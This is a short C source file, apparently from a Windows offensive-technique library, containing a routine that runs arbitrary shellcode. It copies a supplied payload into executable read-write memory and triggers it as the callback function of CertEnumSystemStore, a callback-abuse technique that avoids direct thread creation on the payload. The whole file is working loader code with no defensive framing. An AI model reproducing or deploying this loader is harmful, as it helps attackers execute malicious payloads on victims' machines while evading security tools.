#include "Win32Helper.h"

//CertEnumSystemStore

VOID InvokeCertEnumSystemStoreThreadCallbackRoutine(LPVOID lpParameter)
{
	CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)lpParameter);
}

BOOL MpfSceViaCertEnumSystemStore(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeCertEnumSystemStoreThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}